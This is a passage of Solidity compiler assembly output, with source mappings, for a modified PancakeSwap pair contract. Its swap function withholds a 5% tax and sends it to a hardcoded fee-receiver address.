*/\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_66:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_67\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_63\n      tag_69\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_63\n      tag_73\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_75\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_75:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_76\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1047:1079  uint public price0CumulativeLast */\n    tag_15:\n      tag_63\n      tag_78\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1085:1117  uint public price1CumulativeLast */\n    tag_16:\n      tag_63\n      tag_80\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_17:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_82\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_82:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_83\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_18:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_85\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_85:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_86\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1123:1140  uint public kLast */\n    tag_19:\n      tag_63\n      tag_88\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_20:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n    tag_21:\n      tag_92\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_93\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_93:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_94\n      jump\t// in\n    tag_92:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n    tag_22:\n      tag_58\n      tag_96\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_23:\n      tag_47\n      tag_98\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_24:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_104\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_104:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_105\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_25:\n      tag_63\n      tag_107\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n    tag_26:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_109\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_109:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_110\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":672:694  address public factory */\n    tag_27:\n      tag_58\n      tag_112\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":727:748  address public token1 */\n    tag_28:\n      tag_58\n      tag_114\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_29:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_117\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_30:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_119\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_119:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_120\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_31:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_122\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_122:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_123\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":754:772  uint public taxfee */\n    tag_32:\n      tag_63\n      tag_125\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n    tag_33:\n      tag_41\n      tag_127\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n    tag_46:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_129\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_129:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11898  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11916  amount0Out > 0 || amount1Out > 0 */\n      tag_131\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11915:11916  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11902:11912  amount1Out */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11902:11916  amount1Out > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11916  amount0Out > 0 || amount1Out > 0 */\n    tag_131:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11863:11977  require(... */\n      tag_132\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_132:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11988:12005  uint112 _reserve0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12007:12024  uint112 _reserve1 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12043  getReserves() */\n      tag_133\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12041  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12043  getReserves() */\n      jump\t// in\n    tag_133:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11987:12043  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12102:12111  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12111  amount0Out < _reserve0 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12099  amount0Out */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12111  amount0Out < _reserve0 */\n      lt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12137  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_134\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12128:12137  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12137  amount1Out < _reserve1 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12125  amount1Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12137  amount1Out < _reserve1 */\n      lt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12137  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_134:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12068:12194  require(... */\n      tag_135\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_135:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12205:12218  uint balance0 */\n      0x00\n      dup1\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12318:12321  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12313:12314  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12300:12314  amount0Out * 5 */\n      dup12\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12299:12321  (amount0Out * 5) / 100 */\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12286:12321  amount0Out - (amount0Out * 5) / 100 */\n      dup11\n      sub\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12335:12353  uint taxamount1Out */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12388:12391  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12383:12384  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12370:12384  amount1Out * 5 */\n      dup12\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12491:12497  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12529:12535  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12369:12391  (amount1Out * 5) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12356:12391  amount1Out - (amount1Out * 5) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12491:12497  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12529:12535  token1 */\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12570  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12587  to != _token0 && to != _token1 */\n      tag_138\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12580:12587  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12587  to != _token1 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12576  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12587  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12587  to != _token0 && to != _token1 */\n    tag_138:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12549:12611  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_139\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_139:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12629:12643  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12625:12686  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12686  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12659:12666  _token0 */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12668:12670  to */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12672:12685  taxamount0Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12658  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12686  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_141:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12738:12752  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12734:12795  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12795  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12768:12775  _token1 */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12777:12779  to */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12781:12794  taxamount1Out */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12767  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12795  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_144:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12847:12862  data.length > 0 */\n      dup9\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12843:13087  if (data.length > 0)... */\n      tag_145\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12895:12897  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:12910  IPancakeCallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12932:12942  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12964:12977  taxamount0Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13014:13027  taxamount1Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13065:13069  data */\n      dup15\n      dup15\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_146\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_146:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_147\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_147:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12843:13087  if (data.length > 0)... */\n    tag_145:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13133:13136  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13128:13129  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13115:13129  amount0Out * 5 */\n      dup15\n      dup2\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13114:13136  (amount0Out * 5) / 100 */\n      dup3\n      swap1\n      div\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13163:13177  amount1Out * 5 */\n      swap1\n      dup15\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13162:13184  (amount1Out * 5) / 100 */\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13203:13217  amount0Out > 0 */\n      dup15\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13199:13259  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13242:13252  FeeResiver */\n      sload(0x06)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13259  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13233:13240  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13242:13252  FeeResiver */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13254:13258  tax0 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13232  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13259  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_151:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13311:13325  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13307:13367  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      jumpi\n        /* 